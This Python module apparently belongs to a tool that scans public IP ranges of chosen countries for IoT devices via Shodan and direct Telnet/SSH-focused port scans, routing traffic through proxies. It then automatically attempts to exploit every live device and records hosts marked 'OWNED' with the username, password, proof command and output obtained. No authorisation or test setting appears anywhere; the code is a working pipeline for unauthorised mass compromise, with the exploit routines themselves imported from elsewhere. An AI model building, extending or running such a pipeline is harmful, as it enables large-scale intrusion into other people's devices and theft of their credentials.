import asyncio
import datetime
import logging
import threading
from concurrent.futures import ThreadPoolExecutor

from sqlalchemy.orm import Session

from app.collector.shodan_client import ShodanCollector
from app.collector.direct_scanner import direct_scan, scan_telnet_ssh_focused
from app.collector.verifier import verify_device
from app.collector import proxy_pool
from app.config import settings
from app.models.device import Device, ExploitedDevice, ScanJob, ScanStatus
from app.ml.classifier import DeviceClassifier
from app.ml.cve_mapper import CVEMapper
from app.ml.vulnerability_scorer import VulnerabilityScorer

logger = logging.getLogger(__name__)

AUTO_EXPLOIT_BATCH = 10
VERIFY_BATCH = 25


def _emit(msg: str, level: str = "info"):
    from app.api.scans import _append_log
    _append_log(msg, level)
    logger.info(msg)


def run_collection(db: Session, sample_size: int = 500, auto_exploit: bool = True,
                   direct_scan_enabled: bool = True, direct_sample: int = 2000,
                   ssh_focused: bool = True):
    classifier = DeviceClassifier()
    scorer = VulnerabilityScorer()
    cve_mapper = CVEMapper()

    pool_size = proxy_pool.get_count()
    if pool_size:
        _emit(f"[PROXY] Using {pool_size} proxies ({proxy_pool.get_strategy()}) for verification")
    else:
        _emit("[PROXY] No proxies — direct connections (may fail for RU/IR)", "warn")

    known_ips = {row[0] for row in db.query(Device.ip).all()}
    exploited_ips = {row[0] for row in db.query(ExploitedDevice.ip).all()}
    _emit(f"[SCAN] {len(known_ips)} devices in DB, {len(exploited_ips)} already exploited")
    _emit(f"[SCAN] InternetDB sample_size={sample_size}, direct_scan={direct_scan_enabled} (sample={direct_sample})")

    all_alive_devices = []

    for country in settings.target_countries:
        alive = _collect_source(
            db, "shodan", country, classifier, scorer, cve_mapper,
            known_ips, sample_size=sample_size,
        )
        all_alive_devices.extend(alive)

        if direct_scan_enabled:
            _emit(f"[DIRECT] Starting direct port scan for {country}...")
            exclude = known_ips | {d["ip"] for d in all_alive_devices}

            if ssh_focused:
                raw_direct = scan_telnet_ssh_focused(country, direct_sample, exclude)
            else:
                raw_direct = direct_scan(country, direct_sample, exclude)

            if raw_direct:
                _emit(f"[DIRECT] {country}: {len(raw_direct)} devices found, verifying & saving...")
                direct_alive = _ingest_raw_devices(
                    db, raw_direct, classifier, scorer, cve_mapper, country,
                )
                all_alive_devices.extend(direct_alive)

    _emit("[CENSYS] Skipped — Censys Search API v2 decommissioned", "warn")

    if auto_exploit and all_alive_devices:
        _emit(f"[EXPLOIT] Auto-exploiting {len(all_alive_devices)} alive devices...")
        _run_auto_exploit(db, all_alive_devices, exploited_ips)

    total_exploited = db.query(ExploitedDevice).count()
    _emit(f"[DONE] Pipeline complete. Total exploited devices: {total_exploited}", "success")


def _collect_source(
    db: Session,
    source: str,
    country_code: str,
    classifier: DeviceClassifier,
    scorer: VulnerabilityScorer,
    cve_mapper: CVEMapper,
    exclude_ips: set[str] | None = None,
    sample_size: int = 500,
) -> list[dict]:
    """Collect from Shodan/InternetDB. Returns list of alive device dicts."""
    _emit(f"[{source.upper()}] Starting scan for country={country_code}")

    job = ScanJob(
        status=ScanStatus.RUNNING,
        source=source,
        country_code=country_code,
        started_at=datetime.datetime.now(datetime.UTC),
    )
    db.add(job)
    db.commit()

    alive_devices = []

    try:
        _emit(f"[{source.upper()}] Querying API for {country_code} IoT devices...")
        raw_devices = ShodanCollector().collect_country(
            country_code, exclude_ips=exclude_ips, sample_size=sample_size,
        )
        _emit(f"[{source.upper()}] Received {len(raw_devices)} raw results for {country_code}")

        devices_count = 0
        alive_count = 0
        vulns_count = 0

        for batch_start in range(0, len(raw_devices), VERIFY_BATCH):
            batch = raw_devices[batch_start:batch_start + VERIFY_BATCH]

            def _verify_one(raw):
                ports = raw.get("open_ports") or [raw.get("port", 80)]
                return raw, verify_device(raw["ip"], ports)

            with ThreadPoolExecutor(max_workers=VERIFY_BATCH) as pool:
                futures = [pool.submit(_verify_one, raw) for raw in batch]
                batch_results = [f.result() for f in futures]

            for raw, check in batch_results:
                device = _upsert_device(db, raw)
                device.is_alive = check["is_alive"]
                device.alive_ports = check["alive_ports"]
                device.http_title = check["http_title"]
                device.last_checked = check["last_checked"]

                device_type, confidence = classifier.predict(raw)
                device.device_type = device_type
                device.device_type_confidence = confidence

                vulns = cve_mapper.map_device(raw)
                for v in vulns:
                    v.device_id = device.id
                    db.merge(v)
                vulns_count += len(vulns)
                device.vulnerability_score = scorer.score(device, vulns)
                devices_count += 1

                if check["is_alive"]:
                    alive_count += 1
                    alive_devices.append({
                        "id": device.id,
                        "ip": raw["ip"],
                        "port": raw.get("port", 80),
                        "ports": check["alive_ports"] or raw.get("open_ports", []),
                        "device_type": str(device.device_type.value) if device.device_type else "unknown",
                        "country": raw.get("country_code", country_code),
                        "banner": raw.get("banner"),
                        "manufacturer": raw.get("manufacturer"),
                        "vulns": [v.cve_id for v in vulns],
                    })

            db.commit()
            if batch_results:
                last_raw, last_check = batch_results[-1]
                _emit(
                    f"[VERIFY] {country_code} [{devices_count}/{len(raw_devices)}] "
                    f"alive: {alive_count}/{devices_count}"
                )

        job.status = ScanStatus.COMPLETED
        job.devices_found = devices_count
        job.vulns_found = vulns_count
        job.finished_at = datetime.datetime.now(datetime.UTC)
        db.commit()
        _emit(
            f"[{source.upper()}] DONE {country_code}: {devices_count} devices, "
            f"{alive_count} alive, {vulns_count} CVEs",
            "success",
        )
    except Exception as e:
        job.status = ScanStatus.FAILED
        job.error_message = str(e)[:500]
        job.finished_at = datetime.datetime.now(datetime.UTC)
        db.commit()
        _emit(f"[{source.upper()}] FAILED {country_code}: {e}", "error")

    return alive_devices


def _ingest_raw_devices(
    db: Session,
    raw_devices: list[dict],
    classifier: DeviceClassifier,
    scorer: VulnerabilityScorer,
    cve_mapper: CVEMapper,
    country_code: str,
) -> list[dict]:
    """Verify and save raw device dicts from direct scanner. Returns alive devices."""
    job = ScanJob(
        status=ScanStatus.RUNNING,
        source="direct",
        country_code=country_code,
        started_at=datetime.datetime.now(datetime.UTC),
    )
    db.add(job)
    db.commit()

    alive_devices = []
    devices_count = 0
    alive_count = 0
    vulns_count = 0

    try:
        for batch_start in range(0, len(raw_devices), VERIFY_BATCH):
            batch = raw_devices[batch_start:batch_start + VERIFY_BATCH]

            for raw in batch:
                device = _upsert_device(db, raw)
                ports = raw.get("open_ports", [raw.get("port", 80)])
                device.is_alive = True
                device.alive_ports = ports
                device.last_checked = datetime.datetime.now(datetime.UTC)

                device_type, confidence = classifier.predict(raw)
                device.device_type = device_type
                device.device_type_confidence = confidence

                vulns = cve_mapper.map_device(raw)
                for v in vulns:
                    v.device_id = device.id
                    db.merge(v)
                vulns_count += len(vulns)
                device.vulnerability_score = scorer.score(device, vulns)
                devices_count += 1
                alive_count += 1

                alive_devices.append({
                    "id": device.id,
                    "ip": raw["ip"],
                    "port": raw.get("port", 80),
                    "ports": ports,
                    "device_type": str(device.device_type.value) if device.device_type else "unknown",
                    "country": raw.get("country_code", country_code),
                    "banner": raw.get("banner"),
                    "manufacturer": raw.get("manufacturer"),
                    "vulns": [v.cve_id for v in vulns],
                })

            db.commit()
            _emit(f"[DIRECT] {country_code}: ingested {devices_count}/{len(raw_devices)}")

        job.status = ScanStatus.COMPLETED
        job.devices_found = devices_count
        job.vulns_found = vulns_count
        job.finished_at = datetime.datetime.now(datetime.UTC)
        db.commit()
        _emit(f"[DIRECT] DONE {country_code}: {alive_count} alive devices saved", "success")
    except Exception as e:
        job.status = ScanStatus.FAILED
        job.error_message = str(e)[:500]
        job.finished_at = datetime.datetime.now(datetime.UTC)
        db.commit()
        _emit(f"[DIRECT] FAILED {country_code}: {e}", "error")

    return alive_devices


def _run_auto_exploit(db: Session, alive_devices: list[dict], already_exploited: set[str]):
    """Auto-exploit alive devices that haven't been exploited yet."""
    from app.services.exploit_service import auto_exploit_device, ExploitResult

    targets = [d for d in alive_devices if d["ip"] not in already_exploited]
    if not targets:
        _emit("[EXPLOIT] All alive devices already exploited — nothing to do")
        return

    _emit(f"[EXPLOIT] {len(targets)} targets to try (skipping {len(alive_devices) - len(targets)} already owned)")

    success_count = 0
    fail_count = 0

    for i in range(0, len(targets), AUTO_EXPLOIT_BATCH):
        batch = targets[i:i + AUTO_EXPLOIT_BATCH]

        async def _exploit_batch(batch_items):
            results = []
            for dev in batch_items:
                try:
                    result = await auto_exploit_device(
                        ip=dev["ip"],
                        ports=dev["ports"],
                        device_type=dev.get("device_type", "unknown"),
                        vulns=dev.get("vulns"),
                        banner=dev.get("banner"),
                        manufacturer=dev.get("manufacturer"),
                        country=dev.get("country"),
                    )
                    results.append((dev, result))
                except Exception as e:
                    logger.warning("Exploit error for %s: %s", dev["ip"], e)
                    results.append((dev, None))
            return results

        loop = asyncio.new_event_loop()
        try:
            batch_results = loop.run_until_complete(_exploit_batch(batch))
        finally:
            loop.close()

        for dev, result in batch_results:
            if result and result.success:
                success_count += 1
                _save_exploited(db, dev, result)
                _emit(
                    f"[EXPLOIT] OWNED {dev['ip']}:{result.port} via {result.protocol} "
                    f"({result.username}/{result.password}) — {result.access_level}",
                    "success",
                )
            else:
                fail_count += 1

        db.commit()
        total_owned = db.query(ExploitedDevice).count()
        _emit(
            f"[EXPLOIT] Progress: {success_count} new owned, {fail_count} failed, "
            f"{total_owned} total owned"
        )

    _emit(f"[EXPLOIT] DONE: {success_count} newly exploited out of {len(targets)} targets", "success")


def _save_exploited(db: Session, dev: dict, result):
    from app.models.device import ExploitedDevice, ExploitStatus

    existing = db.query(ExploitedDevice).filter(ExploitedDevice.ip == dev["ip"]).first()
    if existing:
        existing.port = result.port
        existing.protocol = result.protocol
        existing.username = result.username
        existing.password = result.password
        existing.proof_command = result.command
        existing.command_output = result.output
        existing.access_level = result.access_level
        existing.status = ExploitStatus.SUCCESS
        existing.verified_at = datetime.datetime.now(datetime.UTC)
        return

    ed = ExploitedDevice(
        device_id=dev.get("id"),
        ip=dev["ip"],
        port=result.port,
        protocol=result.protocol,
        username=result.username,
        password=result.password,
        proof_command=result.command,
        command_output=result.output,
        access_level=result.access_level,
        status=ExploitStatus.SUCCESS,
        device_type=dev.get("device_type"),
        country_code=dev.get("country"),
        manufacturer=dev.get("manufacturer"),
    )
    db.add(ed)


def _upsert_device(db: Session, raw: dict) -> Device:
    existing = (
        db.query(Device)
        .filter(Device.ip == raw["ip"], Device.port == raw["port"])
        .first()
    )
    if existing:
        for k, v in raw.items():
            if k not in ("source",) and v is not None:
                setattr(existing, k, v)
        return existing
    device = Device(**raw)
    db.add(device)
    db.flush()
    return device
